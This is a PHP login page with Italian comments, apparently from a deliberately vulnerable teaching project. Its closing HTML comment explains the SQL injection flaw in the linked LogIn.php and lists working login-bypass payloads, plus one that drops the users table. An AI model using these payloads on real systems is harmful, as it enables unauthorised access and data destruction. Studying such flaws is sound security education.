<html>
	<head>
		<title> Index LogIn </title>
		<link href="ConPiùStile.css" rel="stylesheet" type="text/css">
	</head>
	<style>
		body{
			background:url(img/peace.jpg);
			background-position:0 50;
			-moz-background-size: cover;
			-webkit-background-size: cover;
			background-size: cover;
		}
	</style>
	<body>
	<?php
	session_start();
	if($_SESSION['check'] != 'TRUE'){							//Se controllo non ancora eseguito, lo esegue
		header("location:check.php");
	}
	else{
		$_SESSION['check'] = '';								//Modifica per successivo controllo
	}
	if(isset($_GET['LogOut'])){									// Se index tramite GET di LogOut reimposto
		$_SESSION['error'] = "LogOut Eseguito Con Successo!";	// reimposto var di sessione
		$_SESSION['log'] = FALSE;
		$_SESSION['user'] = '';
	}
?>
		<?php if(isset($_SESSION['error'])) echo "<center><font color='red'; size=5>".$_SESSION['error']."</center></font>"; ?>		<!-- Stampo Errori Catturati -->
		<form action="LogIn.php" method="POST">
			<div id="main">
			<center><h1><font size=20 color='green'> Log-In </font></h1> <br/>
			<div id="login">
			<label> Nome Utente: </label><br/>
			<input align="center" id="name" name="username" placeholder="username" type="text"><br/><br/>
			<label> Password Utente: </label><br/>
			<input align="center" id="password" name="password" placeholder="******" type="password"><br/><br/><br/>
			<input type="submit" value="LoG-In">
			</center>
		</form>
		<br/><br/><br/><br/><br/>
		<?php
			echo "<p><font color='white'; size=3><center>Clicca <a href=\"registration.php\" style=\"color:white\"> QUI </a> per registrarti.</center></font></p>";
			$_SESSION['error'] = "";
		?>
		</div>
		</div>
	</body>
</html>

<!--
Errori nel codice: la variabile "$_POST['username']" viene processata direttamente nel DBMS
come query per estrarre i risultati dalla tabella "userstab". Non essendoci alcun controllo
sui caratteri consentiti è possibile ottenere una query "TRUE" inserendo del codice SQL puro.
Inserendo come username " ' OR TRUE /* " la query di controllo diviene del tipo: 
"SELECT * FROM `userstab` WHERE name='' OR TRUE/* AND pass='' "; 
questa query non garantisce l'accesso all'homepage essendo:
"if(mysql_num_rows($ris) == 1){ $_SESSION['user'] = $username; header("Location: homepage.php");}".
Per garantire l'accesso all'homepage è necessario ottenere un solo riscontro "mysql_num_rows($ris) == 1".
Le sintassi utilizzabili sono:
- "  Nome Utente: root' OR '1'='0    "		// Si logga attraverso nome utente
- "  Nome Utente: ' OR ID=1 OR '1'='0  "	// Si logga attraverso ID
- "  Nome Utente: ' OR name IN (SELECT name FROM userstab WHERE ID=1) OR '1'='0   "		// Si logga attraverso ID usando una subquery
- "  Nome Utente: ' OR 'a'='a"  " Password: toor"	// Si logga attraverso password
- "  Nome Utente: ""  Password: 1'='1'; DROP TABLE userstab "
Qualunque sintassi che ritorni un valore complessivo "TRUE" con un'unica incidenza permetterà di effettuare il login.
Per ovviare il problema eliminare i commenti su "LogIn.php" rendendo funzionante il codice in essi racchiuso.
--> 